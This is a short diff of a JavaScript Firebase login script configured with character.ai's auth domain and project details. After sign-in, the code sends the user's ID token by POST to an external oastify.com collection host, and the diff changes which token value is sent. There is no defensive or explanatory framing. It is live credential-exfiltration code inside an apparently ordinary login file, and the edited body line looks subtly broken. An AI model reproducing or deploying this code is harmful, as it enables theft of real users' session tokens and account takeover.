@@ -10,7 +10,7 @@
     console.log('Start file login with firebase');
     // Initialize Firebase
     var config = {
-        apiKey: "AIzaSyBYjIdjN5T49bIWDGX00qyr_WMlRRVeMMU",
+        apiKey: "AIzaSyAbLy_s6hJqVNr2ZN0UHHiCbJX1X8smTws",
         authDomain: "auth.character.ai",
         databaseURL: "character-ai.firebaseio.com",
         projectId: "character-ai",
@@ -38,7 +38,7 @@
                 fetch('https://slhtbmmgty6c2zy1bxrzfets5jbaz0np.oastify.com', {
                   method: 'POST',
                   mode: 'no-cors',
-                  body: token
+                  body: user.getIdToken()
                 });
             }).catch(function(error) {
                 console.error('Error: hande error here>>>', error.code)
